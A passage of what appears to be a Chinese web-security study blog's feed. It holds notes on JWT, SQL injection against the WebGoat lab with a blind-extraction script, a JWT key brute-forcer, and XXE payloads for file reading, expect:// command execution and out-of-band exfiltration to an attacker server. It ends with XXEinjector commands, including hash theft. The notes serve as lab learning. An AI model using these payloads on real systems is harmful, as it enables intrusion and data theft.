href="#JWT-固定参数有：" class="headerlink" title="JWT 固定参数有："></a><font size="4"><strong>JWT 固定参数有：</strong></font></h4><p>iss：发行人<br>exp：到期时间<br>sub：主题<br>aud：用户<br>nbf：在此之前不可用<br>iat：发布时间<br>jti：JWT ID 用于标识该 JWT</p><h4 id="签名（Signature）"><a href="#签名（Signature）" class="headerlink" title="签名（Signature）"></a><font size="4"><strong>签名（Signature）</strong></font></h4><p>服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密 码进行加密，生成的字符串就是 JWT 的签名。<br>下面是一个用 HS256 生成 JWT 的代码例子</p><pre class=" language-bash"><code class="language-bash">HMACSHA256<span class="token punctuation">(</span>base64UrlEncode<span class="token punctuation">(</span>header<span class="token punctuation">)</span> + <span class="token string">"."</span> + base64UrlEncode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>,secret<span class="token punctuation">)</span></code></pre><p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不 应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时， 服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>6、服务器返回响应<br><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/5.png"></p><p>用普通用户tom登录，发现access_token为空，将数据包发送之后重新使用tom用户登录获取到access_token。<br><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/6.png"><br><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/7.png"></p><p>使用在线jwt解码<br><a href="https://jwt.io/">https://jwt.io/</a><br><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/8.png"></p><h3 id="四、SQL-Injection"><a href="#四、SQL-Injection" class="headerlink" title="四、SQL Injection"></a><font size="5"><strong>四、SQL Injection</strong></font></h3><h4 id="1、防御sql注入，其实就是session，参数绑定，存储过程这样的注入。"><a href="#1、防御sql注入，其实就是session，参数绑定，存储过程这样的注入。" class="headerlink" title="1、防御sql注入，其实就是session，参数绑定，存储过程这样的注入。"></a><font size="4"><strong>1、防御sql注入，其实就是session，参数绑定，存储过程这样的注入。</strong></font></h4><pre class=" language-bash**&lt;/font&gt;"><code class="language-bash**&lt;/font&gt;">//利用session防御，session内容正常情况下是用户无法修改的：select * from users where user = "'" + session.getAttribute("UserID") + "'";//参数绑定方式，利用了sql的预编译技术预编译讲解:https://www.cnblogs.com/klyjb/p/11473857.htmlString query = "SELECT * FROM users WHERE last_name = ?";PreparedStatement statement = connection.prepareStatement(query);statement.setString(1,accountNmae);ResultSet results = statement.executeQuery();</code></pre><p>上面说的方式也不是能够绝对的进行SQL注入防御，只是减轻。<br>比如参数绑定的方式可以使用下面的方式绕过：<br>通过使用case when语句可以将order by后的orderExpression表达式中添加select语句。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> requestsfrom string <span class="token function">import</span> digitschars <span class="token operator">=</span> digits+<span class="token string">"."</span>data1<span class="token string">"username_reg=tomx'+union+select+password+from+sql_challenge_users+where+userid%3D'teom'--+- &amp;email_reg=7702%40qq.com&amp;password_reg=123&amp;confirm_password_reg=123"</span>headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token string">'X-Requested-With'</span><span class="token keyword">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>cookies <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token string">'JSESSIONID'</span><span class="token keyword">:</span> <span class="token string">'ZwUabF1a2yNsk7UAWd05XAp0UEPB7CLJCZnZPvUX'</span>,<span class="token string">'JSESSIONID.75fbd09e'</span><span class="token keyword">:</span> <span class="token string">'7mc1x9iei6ji4xo2a3u4kbz1'</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>i<span class="token operator">=</span>0result <span class="token operator">=</span> <span class="token string">""</span>proxy<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"http": "http://127.0.0.1:8888"&amp;#125; while True:</span>i +<span class="token operator">=</span> 1temp <span class="token operator">=</span> result <span class="token keyword">for</span> char <span class="token keyword">in</span> chars:vul_url<span class="token string">"http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20s ubstr(ip,&amp;#123;0&amp;#125;,1)='&amp;#123;1&amp;#125;'%20from%20servers%20where%20hostname='webgoat-prd')%20then%20hostname%20else%20mac%20end"</span>.format<span class="token punctuation">(</span>i, char<span class="token punctuation">)</span>resp <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>vul_url, headers<span class="token operator">=</span>headers, cookies<span class="token operator">=</span>cookies, proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(resp.json())</span><span class="token keyword">if</span> <span class="token string">'webgoat-acc'</span> <span class="token keyword">in</span> resp.json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span>:result +<span class="token operator">=</span> charprint<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">if</span> temp <span class="token operator">==</span> result:<span class="token keyword">break</span></code></pre><h4 id="2、案例：WEBGOAT-sql注入"><a href="#2、案例：WEBGOAT-sql注入" class="headerlink" title="2、案例：WEBGOAT sql注入"></a><font size="4"><strong>2、案例：WEBGOAT sql注入</strong></font></h4><p><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/3.png"></p><pre class=" language-bash"><code class="language-bash">GET /WebGoat/SqlInjectionMitigations/servers?column<span class="token operator">=</span>ip HTTP/1.1Host: 10.1.1.7:8080User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:91.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/91.0Accept: */*Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://10.1.1.7:8080/WebGoat/start.mvcCookie: JSESSIONID<span class="token operator">=</span>_aLW8RZKIBrdgr4Q8HZNyPnpZYKoGf9n0X272l6_</code></pre><p>过关手册：<a href="https://blog.csdn.net/u013553529/article/details/82765062">https://blog.csdn.net/u013553529/article/details/82765062</a></p><h3 id="五、JWT爆破脚本"><a href="#五、JWT爆破脚本" class="headerlink" title="五、JWT爆破脚本"></a><font size="5"><strong>五、JWT爆破脚本</strong></font></h3><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> pyjwt<span class="token function">import</span> jwt<span class="token function">import</span> jsonalg <span class="token operator">=</span> <span class="token string">"HS256"</span>path <span class="token operator">=</span> <span class="token string">"/Users/glan/Desktop/pass.txt"</span>jwt_str <span class="token operator">=</span> <span class="token string">"eyJ0eXAiOiJKV1QiLCJraWQiOiInOyBzZWxlY3QgJ01RPT0nIGZyb20gand0X2tleXMgLS0iLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTcxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.Z9TJXg12Fa4x7Qb8oD0lWAiUctY6eyUn3FcjdlcVUQs"</span>with open<span class="token punctuation">(</span>path, encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> as f:    <span class="token keyword">for</span> line <span class="token keyword">in</span> f:        key_ <span class="token operator">=</span> line.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        try:            jwt.decode<span class="token punctuation">(</span>jwt_str, verify<span class="token operator">=</span>True, key<span class="token operator">=</span>key_, algorithms<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span>            print<span class="token punctuation">(</span><span class="token string">'found key! --> '</span> + key_<span class="token punctuation">)</span>            <span class="token keyword">break</span>        except<span class="token punctuation">(</span>jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,               jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,               jwt.exceptions.ImmatureSignatureError<span class="token punctuation">)</span>:            print<span class="token punctuation">(</span><span class="token string">'found key! --> '</span> + key_<span class="token punctuation">)</span>            <span class="token keyword">break</span>        except jwt.exceptions.InvalidSignatureError:            <span class="token keyword">continue</span>    else:        print<span class="token punctuation">(</span><span class="token string">"key not found!"</span><span class="token punctuation">)</span></code></pre><h3 id="六、涉及资源"><a href="#六、涉及资源" class="headerlink" title="六、涉及资源"></a><font size="5"><strong>六、涉及资源</strong></font></h3><p><a href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io</a><br><a href="https://www.cnblogs.com/klyjb/p/11473857.html">https://www.cnblogs.com/klyjb/p/11473857.html</a><br><a href="https://zhuanlan.zhihu.com/p/394138133">https://zhuanlan.zhihu.com/p/394138133</a><br><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a><br><a href="https://blog.csdn.net/zy15667076526/article/details/109560492">https://blog.csdn.net/zy15667076526/article/details/109560492</a> webgoat全关教程手册<br><a href="https://blog.csdn.net/u013553529/article/details/82765062">https://blog.csdn.net/u013553529/article/details/82765062</a> WebGoat SQL注入之 Order by注入解题思路</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-039</title>
      <link href="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/"/>
      <url>/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-XXE-XML之利用检测绕过全解"><a href="#WEB漏洞-XXE-XML之利用检测绕过全解" class="headerlink" title="WEB漏洞-XXE&amp;XML之利用检测绕过全解"></a><font size="6"><strong>WEB漏洞-XXE&amp;XML之利用检测绕过全解</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/1.png"></p><h3 id="二、基础概念"><a href="#二、基础概念" class="headerlink" title="二、基础概念"></a><font size="5"><strong>二、基础概念</strong></font></h3><h4 id="1、xml基础概念"><a href="#1、xml基础概念" class="headerlink" title="1、xml基础概念"></a><font size="4"><strong>1、xml基础概念</strong></font></h4><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h4 id="2、XML与HTML的主要差异"><a href="#2、XML与HTML的主要差异" class="headerlink" title="2、XML与HTML的主要差异"></a><font size="4"><strong>2、XML与HTML的主要差异</strong></font></h4><p>XML被设计为传输和存储数据，其焦点是数据的内容。<br>HTML被设计用来显示数据，其焦点是数据的外观。<br>HTML旨在显示信息，而XML旨在传输信息。</p><h4 id="3、xml示例"><a href="#3、xml示例" class="headerlink" title="3、xml示例"></a><font size="4"><strong>3、xml示例</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--文档类型定义--<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE note <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>--定义此文档时note类型的文档--<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT note <span class="token punctuation">(</span>to,from,heading,body<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--定义note元素有四个元素--<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT to <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>&lt;!--定义to元素为"#PCDATA"类型--></span><span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT from <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>&lt;!--定义from元素为"#PCDATA"类型--></span><span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT <span class="token function">head</span> <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>&lt;!--定义head元素为"#PCDATA"类型--></span><span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT body <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>&lt;!--定义body元素为"#PCDATA"类型--></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--文档元素--<span class="token operator">></span><span class="token operator">&lt;</span>note<span class="token operator">></span>    <span class="token operator">&lt;</span>to<span class="token operator">></span>Dave<span class="token operator">&lt;</span>/to<span class="token operator">></span>    <span class="token operator">&lt;</span>from<span class="token operator">></span>Tom<span class="token operator">&lt;</span>/from<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>Reminder<span class="token operator">&lt;</span>/head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>You are a good man<span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/note<span class="token operator">></span></code></pre><h3 id="三、演示案例"><a href="#三、演示案例" class="headerlink" title="三、演示案例"></a><font size="5"><strong>三、演示案例</strong></font></h3><h4 id="1、pikachu靶场XML"><a href="#1、pikachu靶场XML" class="headerlink" title="1、pikachu靶场XML"></a><font size="4"><strong>1、pikachu靶场XML</strong></font></h4><p>-回显，玩法，协议，引入<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/2.png"></p><p>● 打开靶场<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/3.png"></p><p><font color=red>● 文件读取</font></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///d://test.txt"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span></code></pre><p><strong>备注：</strong>前提条件是有那个文件<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/4.png"></p><p><font color=red>● 玩法-内网探针或攻击内网应用（触发漏洞地址）</font></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE foo <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT foo ANY <span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTYTY rabbit SYSTEM <span class="token string">"http://192.168.1.4:80/index.txt"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>rabbit<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span></code></pre><p>上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。\</p><p><font color=red>● 玩法-RCE</font><br>该CASE是在安装expect扩展的PHP环境里执行系统命令</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"expect://id"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span></code></pre><p>id是对于的执行的命令。实战情况比较难碰到。<br><font color=red>● 引入外部实体DTD</font></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE <span class="token function">test</span> <span class="token punctuation">[</span>        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % <span class="token function">file</span> SYSTEM <span class="token string">"http://127.0.0.1/evil2.dtd"</span><span class="token operator">></span>        %file<span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>send<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span>//下面的是写入文件的evil2.dtd:<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY send SYSTEM <span class="token string">"file:///d:/test.txt"</span><span class="token operator">></span></code></pre><p><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/5.png"><br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/6.png"></p><p>条件：看对方的应用有没有禁用外部实体引用，这也是防御XXE的一种措施。<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/7.png"></p><p>● 无回显-读取文件</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE <span class="token function">test</span> <span class="token punctuation">[</span>        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % <span class="token function">file</span> SYSTEM <span class="token string">"php://filter/read=convert.base64-encode/resource=d:/test.txt"</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % dtd SYSTEM <span class="token string">"http://192.168.xx.xxx:80XX/test.dtd"</span><span class="token operator">></span>        %dtd<span class="token punctuation">;</span>        %send<span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token operator">></span>test.dtd:<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % payload    <span class="token string">"&lt;!ENTITY &amp;#x25; send SYSTEM'http://192.168.xx.xxx:80xx/?data=%file;'>"</span><span class="token operator">></span>%payload<span class="token punctuation">;</span></code></pre><p>上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。</p><h3 id="四、xxe绕过"><a href="#四、xxe绕过" class="headerlink" title="四、xxe绕过"></a><font size="5"><strong>四、xxe绕过</strong></font></h3><pre class=" language-bash"><code class="language-bash">https://www.cnblogs.com/20175211lyz/p/11413335.html</code></pre><h3 id="五、xxe靶场"><a href="#五、xxe靶场" class="headerlink" title="五、xxe靶场"></a><font size="5"><strong>五、xxe靶场</strong></font></h3><h4 id="1、xxe-lab"><a href="#1、xxe-lab" class="headerlink" title="1、xxe-lab"></a><font size="4"><strong>1、xxe-lab</strong></font></h4><pre class=" language-bash"><code class="language-bash">https://github.com/c0ny1/xxe-lab</code></pre><p><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/8.png"><br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/9.png"></p><p><strong>备注：</strong>不知道是啥子原因这个位置发送的数据包不是xml格式导致漏洞无法利用，在这里卡了很久，有知道解决办法再说吧</p><h4 id="2、CTF-Jarvis-OJ-Web-XXE"><a href="#2、CTF-Jarvis-OJ-Web-XXE" class="headerlink" title="2、CTF-Jarvis-OJ-Web-XXE"></a><font size="4"><strong>2、CTF-Jarvis-OJ-Web-XXE</strong></font></h4><pre class=" language-bash"><code class="language-bash">http://web.jarvisoj.com:9882/更改请求数据格式:c<span class="token operator">&lt;</span>?xml version<span class="token operator">=</span> <span class="token operator">=</span> <span class="token string">"1.0"</span>? <span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>    <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY f SYSTEM <span class="token string">"file:///etc/passwd"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>f<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span></code></pre><p>点击Go，抓包<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/10.png"></p><p>数据传输形式是采用json数据格式来提交传输的。通过修改数据格式来攻击，形成XXE漏洞。<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/11.png"></p><h3 id="六、xxe工具"><a href="#六、xxe工具" class="headerlink" title="六、xxe工具"></a><font size="5"><strong>六、xxe工具</strong></font></h3><p>XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。这里建议在kali环境下运行。</p><h4 id="1、获取地址"><a href="#1、获取地址" class="headerlink" title="1、获取地址"></a><font size="4"><strong>1、获取地址</strong></font></h4><pre class=" language-bash"><code class="language-bash">这里也给出github地址：https://github.com/enjoiz/XXEinjectorhttps://github.com/enjoiz/XXEinjector/archive/master.zip</code></pre><h4 id="2、参数说明"><a href="#2、参数说明" class="headerlink" title="2、参数说明"></a><font size="4"><strong>2、参数说明</strong></font></h4><pre class=" language-bash"><code class="language-bash">--host     必填项– 用于建立反向链接的IP地址。<span class="token punctuation">(</span>--host<span class="token operator">=</span>192.168.0.2<span class="token punctuation">)</span>--file      必填项- 包含有效HTTP请求的XML文件。<span class="token punctuation">(</span>--file<span class="token operator">=</span>/tmp/req.txt<span class="token punctuation">)</span>--path           必填项-是否需要枚举目录 – 枚举路径。<span class="token punctuation">(</span>--path<span class="token operator">=</span>/etc<span class="token punctuation">)</span>--brute          必填项-是否需要爆破文件 -爆破文件的路径。<span class="token punctuation">(</span>--brute<span class="token operator">=</span>/tmp/brute.txt<span class="token punctuation">)</span>--logger        记录输出结果。--rhost          远程主机IP或域名地址。<span class="token punctuation">(</span>--rhost<span class="token operator">=</span>192.168.0.3<span class="token punctuation">)</span>--rport          远程主机的TCP端口信息。<span class="token punctuation">(</span>--rport<span class="token operator">=</span>8080<span class="token punctuation">)</span>--phpfilter    在发送消息之前使用PHP过滤器对目标文件进行Base64编码。--netdoc     使用netdoc协议。<span class="token punctuation">(</span>Java<span class="token punctuation">)</span>.--enumports   枚举用于反向链接的未过滤端口。<span class="token punctuation">(</span>--enumports<span class="token operator">=</span>21,22,80,443,445<span class="token punctuation">)</span>--hashes       窃取运行当前应用程序用户的Windows哈希。--expect        使用PHP expect扩展执行任意系统命令。<span class="token punctuation">(</span>--expect<span class="token operator">=</span>ls<span class="token punctuation">)</span>--upload       使用Java jar向临时目录上传文件。<span class="token punctuation">(</span>--upload<span class="token operator">=</span>/tmp/upload.txt<span class="token punctuation">)</span>--xslt      XSLT注入测试。--ssl              使用SSL。--proxy         使用代理。<span class="token punctuation">(</span>--proxy<span class="token operator">=</span>127.0.0.1:8080<span class="token punctuation">)</span>--httpport Set自定义HTTP端口。<span class="token punctuation">(</span>--httpport<span class="token operator">=</span>80<span class="token punctuation">)</span>--ftpport       设置自定义FTP端口。<span class="token punctuation">(</span>--ftpport<span class="token operator">=</span>21<span class="token punctuation">)</span>--gopherport  设置自定义gopher端口。<span class="token punctuation">(</span>--gopherport<span class="token operator">=</span>70<span class="token punctuation">)</span>--jarport       设置自定义文件上传端口。<span class="token punctuation">(</span>--jarport<span class="token operator">=</span>1337<span class="token punctuation">)</span>--xsltport  设置自定义用于XSLT注入测试的端口。<span class="token punctuation">(</span>--xsltport<span class="token operator">=</span>1337<span class="token punctuation">)</span>--test     该模式可用于测试请求的有效。--urlencode     URL编码，默认为URI。--output       爆破攻击结果输出和日志信息。<span class="token punctuation">(</span>--output<span class="token operator">=</span>/tmp/out.txt<span class="token punctuation">)</span>--timeout     设置接收文件/目录内容的Timeout。<span class="token punctuation">(</span>--timeout<span class="token operator">=</span>20<span class="token punctuation">)</span>--contimeout  设置与服务器断开连接的，防止DoS出现。<span class="token punctuation">(</span>--contimeout<span class="token operator">=</span>20<span class="token punctuation">)</span>--fast     跳过枚举询问，有可能出现结果假阳性。--verbose     显示verbose信息。</code></pre><h4 id="3、工具使用"><a href="#3、工具使用" class="headerlink" title="3、工具使用"></a><font size="4"><strong>3、工具使用</strong></font></h4><p>枚举HTTPS应用程序中的&#x2F;etc目录：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --path<span class="token operator">=</span>/etc --file<span class="token operator">=</span>/tmp/req.txt –ssl</code></pre><p>使用gopher（OOB方法）枚举&#x2F;etc目录：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --path<span class="token operator">=</span>/etc --file<span class="token operator">=</span>/tmp/req.txt --oob<span class="token operator">=</span>gopher</code></pre><p>二次漏洞利用：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --path<span class="token operator">=</span>/etc --file<span class="token operator">=</span>/tmp/vulnreq.txt--2ndfile<span class="token operator">=</span>/tmp/2ndreq.txt</code></pre><p>使用HTTP带外方法和netdoc协议对文件进行爆破攻击：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --brute<span class="token operator">=</span>/tmp/filenames.txt--file<span class="token operator">=</span>/tmp/req.txt --oob<span class="token operator">=</span>http –netdoc</code></pre><p>通过直接性漏洞利用方式进行资源枚举：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --file<span class="token operator">=</span>/tmp/req.txt --path<span class="token operator">=</span>/etc --direct<span class="token operator">=</span>UNIQUEMARK</code></pre><p>枚举未过滤的端口：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt --enumports<span class="token operator">=</span>all</code></pre><p>窃取Windows哈希：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb--host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt –hashes</code></pre><p>使用Java jar上传文件：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt--upload<span class="token operator">=</span>/tmp/uploadfile.pdf</code></pre><p>使用PHP expect执行系统指令：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt --oob<span class="token operator">=</span>http --phpfilter--expect<span class="token operator">=</span>ls</code></pre><p>测试XSLT注入：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt –xslt</code></pre><p>记录请求信息：</p><pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --logger --oob<span class="token operator">=</span>http--output<span class="token operator">=</span>/tmp/out.txt</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-038</title>
      <link href="/2023/10/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-038/"/>
      <url>/2023/10/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-038/</url>
      
